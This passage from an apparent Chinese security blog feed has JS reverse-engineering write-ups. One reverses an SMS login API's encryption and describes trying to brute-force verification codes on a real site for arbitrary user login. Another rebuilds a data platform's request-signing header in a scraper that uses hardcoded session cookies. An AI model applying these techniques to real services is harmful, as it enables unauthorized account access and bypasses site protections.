    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析系列课程-介绍</title>
    <link href="https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%BB%8B%E7%BB%8D/"/>
    <id>https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%BB%8B%E7%BB%8D/</id>
    <published>2025-11-04T11:03:43.000Z</published>
    <updated>2025-11-04T14:10:29.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="课程介绍"><a href="#课程介绍" class="headerlink" title="课程介绍"></a>课程介绍</h1><p>首先做一个介绍关于恶意代码分析课程，从最开始的免杀学习到越来越深入的内核学习，是时候做一个总结了。恶意代码分析是目前安全不错的一个岗位，也是相比于安服，目前市面上web安全的课程确实不少，但是关于恶意代码分析这一个专题确实不多，所以我会在这门课程做一个总结，希望对学习这块知识的大家在路线上有一个帮助。</p><p>在之后的课程中，逐步介绍，逐步深入，从简入深，融合所有的相关知识，做到面面俱到，紧跟技术发展潮流，从不同的攻击手法到相应的防御手法。（我的梦想）</p><p>这块先不写，因为写作的顺序也是看我的想法，先逐步写，然后再完善目录。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;课程介绍&quot;&gt;&lt;a href=&quot;#课程介绍&quot; class=&quot;headerlink&quot; title=&quot;课程介绍&quot;&gt;&lt;/a&gt;课程介绍&lt;/h1&gt;&lt;p&gt;首先做一个介绍关于恶意代码分析课程，从最开始的免杀学习到越来越深入的内核学习，是时候做一个总结了。恶意代码分析是目前安全不错</summary>
      
    
    
    
    
    <category term="恶意代码分析系列课程" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-实现某短信接口参数加密</title>
    <link href="https://250wuyifan.github.io/2025/11/04/js%E9%80%86%E5%90%91-%E5%AE%9E%E7%8E%B0%E6%9F%90%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/"/>
    <id>https://250wuyifan.github.io/2025/11/04/js%E9%80%86%E5%90%91-%E5%AE%9E%E7%8E%B0%E6%9F%90%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</id>
    <published>2025-11-04T07:10:44.000Z</published>
    <updated>2025-11-04T08:18:26.596Z</updated>
    
    <content type="html"><![CDATA[<p>页面如下。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151220569.png" alt="image-20251104151220569"></p><p>点击获取验证码，只有一个网络请求</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151325309.png" alt="image-20251104151325309"></p><p>burp拦截</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151418820.png" alt="image-20251104151418820"></p><p>参数mobile加密，头部还有一个Sign。这是我们要逆向的两个点。</p><p>首先看到请求加密之后，放到了json中，想到了hook一下json的处理。</p><p>参考我的<a href="https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/">https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151553062.png" alt="image-20251104151553062"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151900187.png" alt="image-20251104151900187"></p><p>断点了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152140635.png" alt="image-20251104152140635"></p><p>跟堆栈，但没有发现明显的加密点。</p><p>全局搜索参数mobile:   随便下几个断点。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152825232.png" alt="image-20251104152825232"></p><p>发现拦截到了没有加密的时候。</p><p>点击步入，跳到了如下函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152951619.png" alt="image-20251104152951619"></p><p>发现这里aes加密手机号，下面还有加密sign值的逻辑，这里我们交给AI，直接写好了脚本。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104153320336.png" alt="image-20251104153320336"></p><p>接下来就可以按照测试验证码的套路来进行测试了，因为这里是四位数的验证码，我们选择自写脚本爆破一波，看看能不能任意用户登录。</p><p>写好了登录的脚步，也能识别了验证码，没想到，短信我以为是四位数，结果是六位数，崩溃了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104160033265.png" alt="image-20251104160033265"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104160056138.png" alt="image-20251104160056138"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;页面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151220569.png&quot; alt=&quot;image-202511041</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-码上爬-题十二JSVMP入门逆向补环境</title>
    <link href="https://250wuyifan.github.io/2025/11/02/js%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC-%E9%A2%98%E5%8D%81%E4%BA%8CJSVMP%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91%E8%A1%A5%E7%8E%AF%E5%A2%83/"/>
    <id>https://250wuyifan.github.io/2025/11/02/js%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC-%E9%A2%98%E5%8D%81%E4%BA%8CJSVMP%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91%E8%A1%A5%E7%8E%AF%E5%A2%83/</id>
    <published>2025-11-02T07:06:29.000Z</published>
    <updated>2025-11-04T11:03:12.447Z</updated>
    
    <content type="html"><![CDATA[<p>逆向点在这个参数的m值，t是时间戳。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151137802.png" alt="image-20251102151137802"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151555082.png" alt="image-20251102151555082"></p><p>hook网络请求断点。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102152739946.png" alt="image-20251102152739946"></p><p>跟堆栈</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153040967.png" alt="image-20251102153040967"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153358185.png" alt="image-20251102153358185"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153643771.png" alt="image-20251102153643771"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153837655.png" alt="image-20251102153837655"></p><p>补一个</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154149932.png" alt="image-20251102154149932"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154209720.png" alt="image-20251102154209720"></p><p>又报错。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154234535.png" alt="image-20251102154234535"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154517869.png" alt="image-20251102154517869"></p><p>这个时候上代理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ProxyDocumentObjects</span>(<span class="params">proxyObjs</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; proxyObjs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> documentObj = proxyObjs[i];</span><br><span class="line">        <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(documentObj);</span><br><span class="line">        keys.<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> value = documentObj[key];</span><br><span class="line">            <span class="keyword">if</span> (value &amp;&amp; <span class="keyword">typeof</span> value === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">                documentObj[key] = <span class="keyword">new</span> <span class="title class_">Proxy</span>(value, &#123;</span><br><span class="line">                    <span class="title function_">get</span>(<span class="params">target, property, receiver</span>) &#123;</span><br><span class="line">                        <span class="keyword">const</span> propValue = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, property, receiver);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;方法:&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;对象:&quot;</span>, <span class="string">`<span class="subst">$&#123;key&#125;</span>`</span>, <span class="string">&quot;属性:&quot;</span>, property, <span class="string">&quot;属性类型:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> property&#125;</span>`</span>, <span class="string">&quot;属性值:&quot;</span>, propValue, <span class="string">&quot;属性值类型:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> propValue&#125;</span>`</span>);</span><br><span class="line">                        <span class="keyword">return</span> propValue;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="title function_">set</span>(<span class="params">target, property, newValue, receiver</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;方法:&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;对象:&quot;</span>, <span class="string">`<span class="subst">$&#123;key&#125;</span>`</span>, <span class="string">&quot;属性:&quot;</span>, property, <span class="string">&quot;属性类型:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> property&#125;</span>`</span>, <span class="string">&quot;属性值:&quot;</span>, newValue, <span class="string">&quot;属性值类型:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> newValue&#125;</span>`</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, property, newValue, receiver);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里需要写对象</span></span><br><span class="line"><span class="keyword">const</span> proxyObjs = [<span class="variable language_">window</span>, <span class="variable language_">document</span>, navigator,location,<span class="variable language_">localStorage</span>,history,screen];</span><br><span class="line"><span class="title class_">ProxyDocumentObjects</span>(proxyObjs);</span><br></pre></td></tr></table></figure><p>一路补环境就完事了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102160402190.png" alt="image-20251102160402190"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;逆向点在这个参数的m值，t是时间戳。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151137802.png&quot; alt=&quot;im</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-某某信数据服务平台</title>
    <link href="https://250wuyifan.github.io/2025/10/30/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E4%BF%A1%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0/"/>
    <id>https://250wuyifan.github.io/2025/10/30/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E4%BF%A1%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0/</id>
    <published>2025-10-30T12:45:25.000Z</published>
    <updated>2025-10-30T15:38:54.705Z</updated>
    
    <content type="html"><![CDATA[<p>逆向点，请求头有个加密的。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221604677.png" alt="image-20251030221604677"></p><p>直接发包。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030205303469.png" alt="image-20251030205303469"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221615317.png" alt="image-20251030221615317"></p><p>跟了几个，发现形式都一样，直接搜索api</p><p>‘&#x2F;api&#x2F;sysapi&#x2F;p_sysapi1007’</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232747683.png" alt="image-20251030232747683"></p><p>进入</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233254428.png" alt="image-20251030233254428"></p><p>下面这个可以平替。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_0x4f66ed = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233235255.png" alt="image-20251030233235255"></p><p>这里进行加密可以直接数组形式输出输入，然后替换即可</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233453545.png" alt="image-20251030233453545"></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 引入 crypto-js</span></span><br><span class="line">_0x4f66ed = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 定义 _0x247b74 配置对象</span></span><br><span class="line"><span class="keyword">var</span> _0x247b74 = &#123;</span><br><span class="line">    <span class="string">&#x27;harmQ&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x38b5f0, _0x3875da</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _0x38b5f0 / _0x3875da;  <span class="comment">// 除法运算</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 模拟 localStorage（Node.js 环境需要）</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">localStorage</span> = &#123;</span><br><span class="line">    <span class="attr">getItem</span>: <span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 返回 null 会使用默认值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. getResCode 函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getResCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x188aa7 = _0x4f66ed[<span class="string">&#x27;AES&#x27;</span>][<span class="string">&#x27;encrypt&#x27;</span>](</span><br><span class="line">        _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x247b74[<span class="string">&#x27;harmQ&#x27;</span>](<span class="keyword">new</span> <span class="title class_">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](), -<span class="number">0xe</span> * <span class="number">0x184</span> + -<span class="number">0x1a80</span> + <span class="number">0x33a0</span>))), </span><br><span class="line">        _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="variable language_">localStorage</span>[<span class="string">&#x27;getItem&#x27;</span>](<span class="string">&#x27;tempenc&#x27;</span>) || <span class="string">&#x27;1234567887654321&#x27;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;iv&#x27;</span>: _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="string">&#x27;1234567887654321&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span>: _0x4f66ed[<span class="string">&#x27;mode&#x27;</span>][<span class="string">&#x27;CBC&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;padding&#x27;</span>: _0x4f66ed[<span class="string">&#x27;pad&#x27;</span>][<span class="string">&#x27;Pkcs7&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Base64&#x27;</span>][<span class="string">&#x27;stringify&#x27;</span>](_0x188aa7[<span class="string">&#x27;ciphertext&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getResCode</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 读取 JS 代码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.js&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 编译 JS 代码</span></span><br><span class="line">js_compile = execjs.<span class="built_in">compile</span>(js_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 动态生成 Accept-EncKey</span></span><br><span class="line">EncKey = js_compile.call(<span class="string">&quot;getResCode&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;✅ 生成的 Accept-EncKey: <span class="subst">&#123;EncKey&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 设置请求参数</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;Hm_lvt_489bd07e99fbfc5f12cbb4145adb0a9b&#x27;</span>: <span class="string">&#x27;1761823133&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Hm_lpvt_489bd07e99fbfc5f12cbb4145adb0a9b&#x27;</span>: <span class="string">&#x27;1761823133&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;HMACCOUNT&#x27;</span>: <span class="string">&#x27;4160D16E28E71D0D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MALLSSID&#x27;</span>: <span class="string">&#x27;75664F2F4B354252375331744B5662564C41393062734C4C6A684F5178674A574759692B794E4B75687166585956696577313643434847734B645744424B6F32&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-EncKey&#x27;</span>: EncKey,  <span class="comment"># 使用动态生成的加密密钥</span></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://webapi.cninfo.com.cn&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://webapi.cninfo.com.cn/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;141&quot;, &quot;Not?A_Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;141&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;macOS&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tdate&#x27;</span>: <span class="string">&#x27;2025-10-29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;market&#x27;</span>: <span class="string">&#x27;SZE&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 发送请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;⏳ 正在发送请求...&quot;</span>)</span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&#x27;https://webapi.cninfo.com.cn/api/sysapi/p_sysapi1007&#x27;</span>, </span><br><span class="line">    cookies=cookies, </span><br><span class="line">    headers=headers, </span><br><span class="line">    data=data</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 处理响应数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;✅ 响应状态码: <span class="subst">&#123;response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = response.json()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result.get(<span class="string">&#x27;resultcode&#x27;</span>) == <span class="number">200</span>:</span><br><span class="line">        records = result.get(<span class="string">&#x27;records&#x27;</span>, [])</span><br><span class="line">        total_count = result.get(<span class="string">&#x27;count&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📊 获取到 <span class="subst">&#123;<span class="built_in">len</span>(records)&#125;</span> 条数据（总计 <span class="subst">&#123;total_count&#125;</span> 条）\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> records:</span><br><span class="line">            <span class="comment"># 转换为 DataFrame</span></span><br><span class="line">            df = pd.DataFrame(records)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 重新排列列顺序（把重要的列放前面）</span></span><br><span class="line">            column_order = [</span><br><span class="line">                <span class="string">&#x27;证券代码&#x27;</span>, <span class="string">&#x27;证券简称&#x27;</span>, <span class="string">&#x27;交易日期&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;开盘价&#x27;</span>, <span class="string">&#x27;收盘价&#x27;</span>, <span class="string">&#x27;最高价&#x27;</span>, <span class="string">&#x27;最低价&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;涨跌&#x27;</span>, <span class="string">&#x27;涨跌幅&#x27;</span>, </span><br><span class="line">                <span 